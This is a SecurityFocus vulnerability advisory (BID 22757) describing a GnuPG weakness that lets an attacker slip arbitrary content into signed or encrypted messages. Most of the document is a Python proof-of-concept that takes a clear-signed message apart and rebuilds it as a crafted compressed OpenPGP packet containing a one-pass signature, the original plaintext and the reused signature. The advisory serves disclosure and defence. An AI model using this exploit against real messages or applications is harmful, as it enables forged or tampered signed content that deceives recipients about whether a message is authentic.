source: http://www.securityfocus.com/bid/22757/info

GnuPG is prone to a weakness that may allow an attacker to add arbitrary content into a message without the end user knowing.

An attacker may be able to exploit this issue in applications using GnuPG to add arbitrary content into a signed and/or encrypted message.

Exploiting this issue depends on the individual application's use of GnuPG. Individual records will be created detailing this issue in affected applications. 

#!/usr/bin/python
import os, gpg, sys, base64

clear_sign = open(sys.argv[1], "rb").read().splitlines()

start = clear_sign.index("-----BEGIN PGP SIGNED MESSAGE-----")
mid = clear_sign.index("-----BEGIN PGP SIGNATURE-----")
end = clear_sign.index("-----END PGP SIGNATURE-----")

text = '\r\n'.join(clear_sign[start+3:mid])
sign = '\n'.join(clear_sign[mid+3:end-1])

onepass = gpg.OnePassSignature()
onepass['keyid'] = (0x12341234,0x12341234)
onepass['digest_algo'] = 2
onepass['pubkey_algo'] = 1
onepass['sigclass'] = 1

plain1 = gpg.Plaintext()
plain1['name'] = 'original'
plain1['data'] = text
plain1['mode'] = 0x62

signature = gpg.Raw()
signature['data'] = base64.decodestring(sign)

compressed = gpg.Compressed()
compressed['algorithm'] = gpg.COMPRESS_ALGO_ZLIB
compressed['data'] = [onepass, plain1, signature]

pkt = gpg.Packet()
pkt['version'] = 1
pkt['data'] = compressed

os.write(1,str(pkt))
